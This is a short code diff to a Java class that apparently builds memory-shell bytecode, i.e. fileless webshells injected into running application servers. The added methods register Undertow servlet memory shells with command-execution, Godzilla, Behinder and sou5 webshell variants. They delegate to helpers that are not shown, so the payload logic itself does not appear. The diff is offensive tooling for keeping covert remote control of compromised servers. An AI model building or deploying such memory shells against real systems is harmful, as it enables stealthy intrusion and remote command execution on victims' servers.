@@ -447,6 +447,35 @@ public class MSJavaClassBuilder {
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
+    @Middleware(Middleware.Undertow)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] undertowServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Undertow)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] undertowServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Undertow)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] undertowServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        behinderMS(javaClassHelper);
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Undertow)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.sou5)
+    public byte[] undertowServletSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
     public void resinListenerResponseMaker(CtClass ctClass) throws Exception {
         // response
         CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
